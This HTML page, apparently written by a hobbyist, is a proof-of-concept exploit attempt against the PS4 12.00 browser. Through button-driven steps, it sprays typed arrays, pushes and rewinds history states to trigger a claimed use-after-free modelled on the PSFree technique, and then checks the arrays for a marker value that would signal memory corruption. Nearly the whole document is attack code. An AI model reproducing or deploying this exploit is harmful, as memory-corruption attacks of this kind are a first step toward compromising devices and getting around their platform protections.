<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 History UAF - Leandro</title>
</head>
<body style="background-color: #f4f4f9; font-family: sans-serif; padding: 20px;">

    <h1>PS4 12.00 - History State UAF</h1>
    <p>Status: <span id="status-pai" style="font-weight:bold;">Aguardando...</span></p>

    <button onclick="prepareObjects()" style="padding: 12px;">1. Preparar Pai</button>
    <button onclick="triggerUAF()" style="padding: 12px;">2. Disparar History UAF</button>
    <button onclick="checkPersistence()" style="padding: 12px; background-color: #c8e6c9;">3. Verificar</button>

    <script>
        const PATTERN = 2.121995791e-314; 
        let controllers = [];
        const statusPai = document.getElementById('status-pai');

        function prepareObjects() {
            controllers = [];
            // Dummy call para inicializar o alocador (Técnica PSFree)
            history.replaceState("init", "");
            
            for(let i = 0; i < 5000; i++) {
                let arr = new Float64Array(10);
                arr[0] = i; 
                controllers.push(arr);
            }
            statusPai.innerText = "Objetos prontos e alocador inicializado.";
        }

        async function triggerUAF() {
            document.documentElement.webkitRequestFullscreen();
            
            // Lógica simplificada de popstate do PSFree
            window.onblur = function() {
                // Criamos estados de histórico para ocupar 80 bytes
                for (let i = 0; i < 100; i++) {
                    history.pushState("state" + i, "", "#" + i);
                }

                // Spray massivo para colidir com os estados liberados
                let spray = [];
                for(let i = 0; i < 10000; i++) {
                    spray.push(new Float64Array(10).fill(PATTERN));
                }

                // Forçamos a volta no histórico para causar a confusão de memória
                history.back();

                setTimeout(() => {
                    document.open();
                    document.write('<h1>UAF TRIGGERED</h1>');
                    document.close();
                }, 500);
            };
        }

        function checkPersistence() {
            let corrupted = null;
            for(let i = 0; i < controllers.length; i++) {
                if (controllers[i][0] === PATTERN) {
                    corrupted = controllers[i];
                    break;
                }
            }

            if (corrupted) {
                statusPai.innerHTML = "<span style='color:green;'>✓ SUCESSO! ID Corrompido detectado.</span>";
            } else {
                statusPai.innerHTML = "<span style='color:red;'>✗ FALHA: O sistema limpou a memória.</span>";
            }
        }
    </script>
</body>
</html>
